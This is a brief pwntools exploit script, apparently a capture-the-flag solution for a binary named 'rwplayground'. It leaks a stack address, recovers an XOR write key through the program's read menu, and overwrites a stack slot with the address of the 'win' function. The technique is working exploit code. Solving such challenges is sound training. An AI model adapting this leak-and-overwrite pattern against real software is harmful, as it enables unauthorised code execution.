from pwn import * 

elf = ELF('./rwplayground')
context.binary = elf
context.terminal = ()
if args.REMOTE:
    p = remote('10.42.0.2', 38051)
elif args.GDB:
    p = gdb.debug([elf.path],'''
    b main
    r
    ''')
else:
    p = process([elf.path])

addr_write_key = 0x4040B8


p.recvuntil(b'0x')
stack = p.recvline().strip()
print(stack)
p.sendlineafter(b'> ',b"1")
p.recvline()
p.sendline(b'0x404068')
p.recvuntil(b'0x')
key_read = p.recvline().strip().decode()
print(f"{key_read=}")
p.sendlineafter(b'> ', b'1')
p.recvline()
p.sendline(hex(addr_write_key))
p.recvuntil(b'value: ')
write_key = p.recvline().strip().decode().replace('0x','')
log.success(f"writekey = {write_key}")
write_key = int(write_key,16) ^  int(key_read,16)
p.sendlineafter(b'> ',b"2")
p.recvline()
p.sendline(hex(int(stack,16) + 0x14))
p.recvline()
win_addr = elf.sym['win']
p.sendline(hex(win_addr ^ write_key))
p.interactive()



